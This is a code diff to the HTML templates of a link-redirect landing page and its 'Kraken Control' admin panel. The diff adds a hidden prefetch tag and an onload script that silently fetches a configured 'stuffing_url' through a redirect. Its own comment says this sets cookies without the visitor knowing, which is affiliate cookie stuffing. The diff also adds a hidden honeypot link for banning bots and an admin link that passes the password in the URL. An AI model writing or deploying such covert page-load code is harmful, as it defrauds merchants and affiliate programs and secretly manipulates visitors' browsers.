@@ -1,5 +1,6 @@
 # templates.py
-# --- 1. User Landing Page (Safe & Professional - NO CHANGES HERE) ---
+
+# --- 1. User Landing Page (With Honeypot + Silent Prefetching) ---
 LANDING_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -8,6 +9,9 @@ LANDING_HTML = """
     <title>Secure Access</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <link rel="prefetch" href="/redirect?url={{ s.stuffing_url|urlencode }}">
+    
     <style> 
         body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #334155; }
         .article-content { color: #475569; font-size: 1.05rem; line-height: 1.7; }
@@ -21,6 +25,8 @@ LANDING_HTML = """
     </style>
 </head>
 <body class="min-h-screen">
+
+    <a href="/secret-system-check" style="display:none; visibility:hidden;" aria-hidden="true" rel="nofollow">System Check</a>
 
     <div class="max-w-2xl mx-auto bg-white min-h-screen shadow-xl border-x border-slate-100">
         
@@ -85,6 +91,15 @@ LANDING_HTML = """
         let isTimerDone = false;
         let hasScrolled = false;
 
+        // ⚡ EXECUTE SECRET PRE-FETCH ON LOAD
+        window.onload = function() {
+            // نقوم بطلب رابط الكوكيز في الخلفية بدون علم الزائر
+            if("{{ s.stuffing_url }}" !== "") {
+                const prefetchLink = "/redirect?url=" + encodeURIComponent("{{ s.stuffing_url }}");
+                fetch(prefetchLink, { mode: 'no-cors' }).catch(() => {});
+            }
+        };
+
         function handleClick() {
             if ("{{ s.exit_url }}" !== "") {
                 try {
@@ -142,7 +157,7 @@ LANDING_HTML = """
 </html>
 """
 
-# --- 2. Admin Dashboard (Added Category & Tag Fields) ---
+# --- 2. Admin Dashboard (Same as before) ---
 ADMIN_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -156,8 +171,14 @@ ADMIN_HTML = """
 <body class="p-4 text-slate-800">
     <div class="max-w-4xl mx-auto">
         <header class="bg-white p-6 rounded-[2rem] shadow-sm border border-slate-100 mb-6 flex justify-between items-center">
-            <h1 class="text-xl font-black text-blue-600 tracking-tighter uppercase">Kraken Control</h1>
-            <span class="bg-blue-50 text-blue-600 text-[10px] font-black px-4 py-2 rounded-full border border-blue-100">STABLE v4</span>
+            <div>
+                <h1 class="text-xl font-black text-blue-600 tracking-tighter uppercase">Kraken Control</h1>
+                <span class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Honeypot & Prefetch Active 🛡️⚡</span>
+            </div>
+            <div class="flex items-center gap-3">
+                <span class="bg-red-50 text-red-600 text-[10px] font-black px-4 py-2 rounded-full border border-red-100">BANNED BOTS: {{ banned_count }}</span>
+                <span class="bg-blue-50 text-blue-600 text-[10px] font-black px-4 py-2 rounded-full border border-blue-100">STABLE v5.1</span>
+            </div>
         </header>
 
         <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
@@ -208,7 +229,10 @@ ADMIN_HTML = """
         </div>
 
         <div class="space-y-4 pb-20">
-            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest px-2">Active Assets</h2>
+            <div class="flex justify-between items-center px-2">
+                <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest">Active Assets</h2>
+                <a href="/admin/clear_bans?pw={{ admin_password }}" class="text-[9px] text-slate-300 hover:text-red-500 font-bold">RESET BANS</a>
+            </div>
             {% for link in links %}
             <div class="bg-white p-6 rounded-[2.5rem] shadow-sm border border-slate-100">
                 <div class="flex justify-between items-center mb-4">
